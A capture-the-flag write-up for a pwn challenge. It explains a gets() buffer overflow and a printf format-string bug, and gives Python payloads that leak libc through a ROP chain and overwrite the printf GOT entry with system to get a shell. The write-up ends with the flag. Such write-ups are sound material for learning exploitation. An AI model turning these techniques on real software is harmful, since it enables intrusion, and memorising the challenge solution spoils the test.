# Return Of The ROPs
#### Description
Is ROP dead? God no. But it returns from a long awaited time, this time in a weird fashion. Three instructions ... can you pwn it?
#### Author
Tango
#### Points and solves
480 points, 55 solves.


This binary is a simpler version of pwn_inn. I recommend reading pwn_inn first before reading this one, I use some notation from pwn inn's writeup.

```c
undefined8 main(void)
{
  char local_28 [32];
  
  ignore_me_init_buffering();
  puts("What would you like to say?");
  gets(local_28);
  printf(local_28);
  return 0;
}
```

Buffer overflow and string format attack, there's nothing more we could ask for.

### Leaking libc:
```python
payload = 40*b"A" +  p64(pop_rdi) + p64(elf.sym.got["puts"]) + p64(elf.sym.plt["puts"]) + p64(elf.sym.main)
```
Simple ROP chain to leak ```puts``` address.
We don't have a libc version, so we use the website [libc database search](https://libc.nullbyte.cat/) to narrow down libc version based on known addresses.

## Getting shell:
We overwrite printf with system, in the same manner we did in pwn_inn, just instead using 3 batches, I used 2 batches and discarded the ```BBBB``` part because it's just uneccessary. (Because for both it's 0x007f.)

```python
payload = b"%" + ("%05d"%l[0]).encode("ascii") + b"d%13$hn" +\
		  b"%" + ("%05d"%(l[1]-l[0])).encode("ascii") + b"d%14$hn"
payload += (0x28-len(payload))*b"A" + p64(ret) + p64(elf.sym.main)
for i in range(0,2):
    if l[i] == third2:
        payload += p64(elf.sym.got["printf"]+2)
    if l[i] == third3:
        payload += p64(elf.sym.got["printf"])
```


Send this payload and get shell :)

#### Flag
```flag{w3_d0n't_n33d_n0_rdx_g4dg3t,ret2csu_15_d3_w4y_7821243}```
